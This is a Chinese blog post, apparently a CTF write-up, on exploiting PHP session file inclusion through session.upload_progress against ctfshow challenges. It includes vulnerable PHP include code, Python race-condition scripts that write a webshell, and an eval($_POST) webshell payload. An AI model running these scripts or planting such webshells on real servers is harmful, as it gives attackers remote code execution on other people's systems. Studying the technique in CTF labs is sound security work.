---
title: session包含
date: 2024-05-24 15:27:21
permalink: /pages/07a506/
categories:
  - web
tags:
  - session包含
  - 文件包含
author: 
  name: ajay
  link: https://the0n3.top
---

# session包含

阅读完可以继续看大佬的这篇文章，加深理解

- [利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)
- [session利用的小思路](https://xz.aliyun.com/t/10662?time__1311=mq%2BxBDy7G%3DKrD%2FD0DoYR4WqGKGQ5wN4x&alichlgref)

## session介绍

[session是什么](https://baike.baidu.com/item/PHP%20Sessions/13209803?fr=ge_ala)

简单的理解，session是一个记录用户行为会话的信息，在php中默认是不会生成session的，但是**允许用户自定义session**

session会记录什么呢

<!-- more -->

![1](https://the0n3.top/medias/session-include/1.png)

::: tip
在服务器上存储用户信息以便随后使用（比如用户名称、购买商品,文件上传等）。然而，**会话信息是临时的**，这些session信息一般储存在/tmp/sess_sessionid文件中，在用户离开网站后将被删除。如果您需要永久存储信息，可以把数据存储在数据库中。
:::

其他可能储存的位置

- /var/lib/php/
- /var/lib/php/sessions/
- /tmp/
- /tmp/sessions/

## 步入正题

它的正经用途介绍结束了，下面讲讲恶趣味

引用开头大佬文章内容

![1](https://the0n3.top/medias/session-include/2.png)

关键点：

- session文件默认用户可以自定义
- 文件上传时默认生成session，记录详细信息和跟踪上传进度
- session.upload_progress.cleanup配置项默认打开，**伪造的文件上传后，会清空session**

## 测试

题目地址[ctfshow easy_include](https://ctf.show/challenges#easy_include-4260)

```php
<?php

function waf($path){
    $path = str_replace(".","",$path);
    return preg_match("/^[a-z]+/",$path);
}

if(waf($_POST[1])){
    include "file://".$_POST[1];
}
```

通过伪造”文件上传“创建session脚本

```python
import requests
 
url="https://642a817d-1d1a-4f22-aded-f796560bdd17.challenge.ctf.show/"
sessionid = 'ctfshow'

data = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php phpinfo();?>',
    '1': 'localhost/tmp/sess_'+sessionid,
    }
 
file = {
    'file': sessionid
}
cookies = {
    'PHPSESSID': sessionid
}

response = requests.post(url=url,data=data,files=file,cookies=cookies)
print(response.text)
```

可以把session内容换成以下内容，生成一个新的木马文件

```php
<?php
file_put_contents('1.php','<?php eval($_POST[1]);?>');
?>
```

现在可以通过post传参传入1=localhost/tmp/sess_ctfshow包含这个session文件

![4](https://the0n3.top/medias/session-include/4.png)

讲到现在有什么疑惑吗。？

它的session文件没有被清除？

::: warning
session.upload_progress.cleanup = on //表示当文件上传结束后，php将会立即清空对应session文件中的内容
:::

这个脚本并没有条件竞争功能，它的session文件在伪造的文件上传后，没有并被清空

::: tip
session文件是有生命周期的，一般是24分钟，但是他只是会过期，并不会删除，这么说可以一直利用？
:::

这一题比较特殊，通过后期getshell查看phpinfo()函数时可以看到配置项**session.upload_progress.cleanup**是关的，应该是群主改了，好大的雷，趁热打铁复现时卡死我了，才去了解这个配置项

![3](https://the0n3.top/medias/session-include/3.png)

## 条件竞争

### post表单类型

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include$_POST[1];
```

::: tip
session.upload_progress.cleanup=On # 一般都是开启的，文件上传后会清空session文件，清空后你再包含就达不到目的了
:::

通过条件竞争，在session文件没有被清空时包含并执行，直接食用或者生成小马都行

```python

import requests
import threading
import time

url = 'https://85a94ccd-c8d7-40ac-ae8f-38ce8f7febb6.challenge.ctf.show/'
sessionid = 'ctfshow'
data = {
    # session文件内容
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php file_put_contents("shell.php","<?php phpinfo();?>");?>',
    # session文件路径可能不同
    '1': '/tmp/sess_' + sessionid,
}

file = {
    'file': sessionid
}

cookies = {
    'PHPSESSID': sessionid
}

# 上传文件函数
def upload_file():
    while True:
        response = requests.post(url, data=data, files=file, cookies=cookies)
        time.sleep(1)  # 为了避免发送请求过快，可以适当增加间隔时间

# 检查文件是否已创建
def check_file():
    while True:
        r = requests.get(url + 'shell.php')
        if r.status_code == 200:
            print('Webshell created successfully')
            print(r.text)
            break
        else:
            print('error：', r.status_code)
        # time.sleep(1)  # 为了避免发送请求过快，可以适当增加间隔时间

# 创建并启动线程
threads = []
for _ in range(5):  # 创建5个上传线程
    t = threading.Thread(target=upload_file)
    t.start()
    threads.append(t)

for _ in range(5):  # 创建5个检查线程
    t = threading.Thread(target=check_file)
    t.start()
    threads.append(t)

# 等待所有线程完成
for t in threads:
    t.join()
```


### get表单类型

对post类型稍加修改

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include$_GET[1];
```

条件竞争脚本

```python

import io
import requests
import threading

url = 'https://85a94ccd-c8d7-40ac-ae8f-38ce8f7febb6.challenge.ctf.show/'
sessionid = 'ctfshow'

def write(session): # 写入临时文件
    while True:
        fileBytes = io.BytesIO(b'a'*1024*50) # 50kb
        session.post(url,
        cookies = {'PHPSESSID':sessionid},
        data = {'PHP_SESSION_UPLOAD_PROGRESS':"<?php file_put_contents('/var/www/html/shell.php','<?php phpinfo();?>');?>"},
        files={'file':('1.jpg',fileBytes)}
        )

def read(session):
    while True:
        session.get(url + '?1=/tmp/sess_' + sessionid) # 进行文件包含
        r = session.get(url+'shell.php') # 检查是否写入一句话木马
        if r.status_code == 200:
            print('OK')
            return ;

evnet=threading.Event() # 多线程

session = requests.session()
for i in range(5):
    threading.Thread(target = write,args = (session,)).start()
for i in range(5):
    threading.Thread(target = read,args = (session,)).start()

evnet.set()
```

最后好奇的查看/tmp目录下的文件，看到一些奇怪的php开头的文件名，里面内容是ctfshow
![5](https://the0n3.top/medias/session-include/5.png)

根据开头这张图就可以解释这些文件名是什么了，session文件包含进来时，显示一个序列化的数组数据，这些php开头的文件是临时文件名
![4](https://the0n3.top/medias/session-include/4.png)


